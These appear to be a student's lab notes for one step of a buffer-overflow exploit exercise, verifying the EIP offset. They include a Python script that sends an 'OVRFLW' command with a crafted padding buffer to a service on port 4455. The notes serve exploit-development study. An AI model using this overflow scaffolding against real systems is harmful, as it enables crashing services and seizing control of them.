3. Verify Offset

3. Verify Offset


Run the exploit
![149dea2fe174ca59b4dbdb0789ed308c.png](../../../_resources/27b14c2fadc6445d86f2f3d40bbfee3a.png)

It crashes at 42424242
![c1e4c65c57e3b00b09c05b0bbb6b8dc0.png](../../../_resources/fe334eaf11824c5fb32bc5a533f7951d.png)

ESP points to the beginnning of the C's
EAX points to the beginning of the overflow command

Here is the code to verify offset
![fc4181b0d9f68641a78890e44b0c19bd.png](../../../_resources/efd420d6e41c4c22867a6ad1aa323382.png)

```python
kali@kali:~/gitWorkspace/exam/bf$ cat 3_verify_offset.py 
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "
filler  = "\x41" * 1493
eip     = "\x42" * 4
bf      = "\x43" * 1503
end = "\r\n"

buffer = cmd + filler + eip + bf + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
```



